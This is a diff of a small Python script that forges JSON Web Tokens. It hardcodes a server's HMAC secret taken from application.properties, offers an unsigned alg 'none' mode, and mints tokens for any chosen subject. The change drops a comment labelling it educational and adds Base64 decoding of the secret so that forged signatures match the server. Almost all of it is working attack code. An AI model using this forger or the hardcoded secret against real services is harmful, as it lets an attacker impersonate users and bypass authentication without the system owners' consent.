@@ -1,8 +1,6 @@
 # -*- coding: utf-8 -*-
-# 교육용: 알려진 secret 으로 JWT 를 직접 서명(위조)한다. (의존성 없이 표준 라이브러리만)
 import hmac, hashlib, base64, json, time, sys
 
-# application.properties 의 jwt.secret 값(문자열). 서버는 이 문자열의 getBytes() 를 HMAC 키로 쓴다.
 SECRET = "5367566B59703373367639792F423F4528482B4D6251655468576D5A71347437"
 
 def b64u(b):
@@ -17,7 +15,10 @@ def forge(sub, ttl=3600, alg="HS256"):
     signing_input = h + b"." + p
     if alg == "none":
         return (signing_input + b".").decode()
-    sig = hmac.new(SECRET.encode(), signing_input, hashlib.sha256).digest()
+    
+    # 수정 포인트: Base64 디코딩 적용
+    secret_bytes = base64.b64decode(SECRET)
+    sig = hmac.new(secret_bytes, signing_input, hashlib.sha256).digest()
     return (signing_input + b"." + b64u(sig)).decode()
 
 if __name__ == "__main__":
